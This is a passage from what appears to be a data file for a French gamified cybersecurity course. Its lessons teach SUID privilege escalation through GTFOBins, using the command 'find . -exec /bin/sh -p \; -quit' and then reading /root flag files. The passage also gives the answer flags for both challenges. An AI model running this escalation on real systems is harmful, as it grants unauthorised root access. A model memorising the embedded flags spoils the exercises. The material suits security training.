    id: 'm5-l8',
    unitId: 'm5',
    title: "8. La Bible GTFOBins : Détourner un Binaire",
    icon: '📖',
    xp: 50,
    lessonSlides: [
      {
        title: "Le Projet GTFOBins",
        bullets: [
          "Si un binaire système anodin comme `find`, `vim`, `bash`, `python` ou `cp` possède le bit SUID, c'est la fin immédiate de la sécurité du système.",
          "Le projet mondial **GTFOBins** répertorie les commandes exactes permettant de forcer ces programmes ordinaires à spawner un terminal root !",
          "Par exemple, la commande `find` possède l'option `-exec` pour exécuter une commande sur chaque fichier trouvé."
        ]
      },
      {
        title: "La Commande d'Élévation find",
        bullets: [
          "En tapant : `/usr/bin/find . -exec /bin/sh -p \\; -quit`, que se passe-t-il ?",
          "1. `find` s'exécute avec les droits SUID de root.",
          "2. Son option `-exec` lance `/bin/sh` avec l'option `-p` (**preserve privileges**).",
          "3. Le shell s'ouvre, ton prompt passe instantanément de `$` à `#` : **tu es devenu ROOT Suprême** !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="107" y="50" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle">Binaire SUID : find</text>
          <text x="107" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">-exec /bin/sh -p \;</text>
          <path d="M 200 60 L 235 60" stroke="#10b981" stroke-width="3"/>
          <rect x="245" y="25" width="140" height="70" rx="8" fill="#030712" stroke="#10b981" stroke-width="2"/>
          <text x="315" y="50" fill="#34d399" font-size="12" font-family="monospace" text-anchor="middle" font-weight="bold"># root@cyberlab</text>
          <text x="315" y="70" fill="#34d399" font-size="9" font-family="monospace" text-anchor="middle">Élévation Root Validée !</text>
        </svg>
      `,
      codeSnippet: {
        language: 'bash',
        lines: [
          { num: 1, text: "# 1. Exécution de la charge utile GTFOBins sur le binaire find :" },
          { num: 2, text: "operator@cyberlab:~$ find . -exec /bin/sh -p \\; -quit", isCritical: true, note: "Cette commande GTFOBins force le binaire SUID find à ouvrir un sous-shell root" },
          { num: 3, text: "# 2. Le prompt devient '#' (root) :" },
          { num: 4, text: "root@cyberlab:~# whoami ➔ root" }
        ],
        prompt: "Clique sur la commande GTFOBins qui force find à ouvrir un shell root :"
      },
      tokenPuzzle: {
        instruction: "Assemble la commande GTFOBins pour faire spawner un shell avec find :",
        tokens: ["find .", "-exec /bin/sh -p \\;", "-quit", "cat"],
        correctOrder: ["find .", "-exec /bin/sh -p \\;", "-quit"]
      },
      quickQuiz: {
        prompt: "Quel symbole dans le prompt du terminal confirme sans ambiguïté que tu as conquis les pouvoirs suprêmes de root ?",
        options: [
          { text: "Le caractère dièse '#' remplace le dollar '$' à la fin de la ligne.", isCorrect: true, debrief: "Exact ! Sous Linux, '$' est un utilisateur classique, et '#' est le super-administrateur Root." },
          { text: "L'écran devient bleu ciel et joue de la musique.", isCorrect: false, debrief: "Faux. L'environnement reste textuel dans le terminal." },
          { text: "L'ordinateur se déconnecte immédiatement d'Internet.", isCorrect: false, debrief: "Faux. Devenir root n'interrompt aucune connexion." },
          { text: "La souris cesse physiquement de fonctionner.", isCorrect: false, debrief: "Faux. Le matériel n'est aucunement altéré." }
        ]
      }
    },
    challenge: {
      type: 'terminal',
      instructions: "Dans le terminal, exécute 'find . -exec /bin/sh -p \\; -quit' pour obtenir le shell root (#), puis lis le fichier secret /root/flag.txt avec 'cat'. Soumets la valeur du drapeau CYBER{...} !",
      flag: 'CYBER{SUID_BINARY_GTFOBINS_EUID_ZERO_ROOT}'
    }
  },

  // 9. Boss Fight Ultime Boot2Root : Du Web au Shell Root Suprême
  {
    id: 'm5-l9',
    unitId: 'm5',
    title: "9. ★ BOSS FIGHT ULTIME : BOOT2ROOT ROOT FLAG ★",
    icon: '👑',
    xp: 150,
    isBoss: true,
    lessonSlides: [
      {
        title: "L'Accomplissement Suprême : Boot2Root",
        bullets: [
          "Tu as commencé tout en bas sans savoir ce qu'était un terminal, une adresse IP, un port, une requête HTTP ou une base de données.",
          "Aujourd'hui, tu as assimilé la chaîne d'attaque complète des plus grands professionnels offensifs :",
          "• Navigation et audit Linux (`pwd`, `ls -la`, `cat`, `grep`, `find`).",
          "• Reconnaissance réseau et inspection de services (`ss`, `curl`, `nmap`).",
          "• Détournement SQL et extraction de base (`WHERE`, `UNION SELECT`).",
          "• Falsification de sessions, failles IDOR, injections XSS et falsification JWT.",
          "• Injection de commande RCE, contournement de filtres `${IFS}` et conquête du Root suprême via SUID.",
          "Pour achever ta formation et décrocher la certification CyberRange PRO, lis le drapeau ultime dans `/root/final_flag.txt` !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="20" y="20" width="360" height="80" rx="10" fill="#030712" stroke="#f59e0b" stroke-width="2"/>
          <text x="200" y="55" fill="#fbbf24" font-size="14" font-family="monospace" text-anchor="middle" font-weight="bold">★ ÉPREUVE SUPRÊME BOOT2ROOT CERTIFICATION ★</text>
          <text x="200" y="75" fill="#94a3b8" font-size="11" font-family="monospace" text-anchor="middle">Lecture du Root Flag Final : /root/final_flag.txt</text>
        </svg>
      `,
      codeSnippet: {
        language: 'bash',
        lines: [
          { num: 1, text: "# Lecture du drapeau ultime avec les privilèges root acquis :" },
          { num: 2, text: "root@cyberlab:~# cat /root/final_flag.txt", isCritical: true, note: "Seul l'utilisateur root UID 0 possède les permissions de lire ce fichier sacré" },
          { num: 3, text: "CYBER{M5_BOSS_ROOT_COMPROMISE_FINAL_FLAG}" }
        ],
        prompt: "Clique sur la commande qui lit le fichier final_flag.txt en mode root :"
      },
      tokenPuzzle: {
        instruction: "Assemble la commande finale de capture du root flag :",
        tokens: ["cat", "/root/final_flag.txt", "rm", "whoami"],
        correctOrder: ["cat", "/root/final_flag.txt"]
      },
      quickQuiz: {
        prompt: "Quelle est la définition d'un défi 'Boot2Root' dans les compétitions de cybersécurité (CTF) et pentest ?",
        options: [
          { text: "Une simulation réaliste où l'attaquant part d'un accès réseau externe vierge jusqu'à obtenir le contrôle total du compte root sur la machine.", isCorrect: true, debrief: "Exactement ! Boot2Root symbolise la conquête intégrale et sans concession d'un système." },
          { text: "Un outil pour nettoyer l'écran de l'ordinateur.", isCorrect: false, debrief: "Faux. C'est le Graal de l'évaluation offensive." },
          { text: "Une mise à jour automatique de la suite bureautique.", isCorrect: false, debrief: "Faux. Aucun lien avec la bureautique." },
          { text: "Un protocole d'arrêt d'urgence du courant électrique.", isCorrect: false, debrief: "Faux. Boot2Root est une épreuve de hacking." }
        ]
      }
    },
    challenge: {
      type: 'terminal',
      instructions: "Dans le terminal, deviens root avec la technique GTFOBins apprise, puis lis le drapeau ultime dans /root/final_flag.txt avec 'cat'. Soumets la valeur complète CYBER{...} !",
      flag: 'CYBER{M5_BOSS_ROOT_COMPROMISE_FINAL_FLAG}'
    }
  }
];
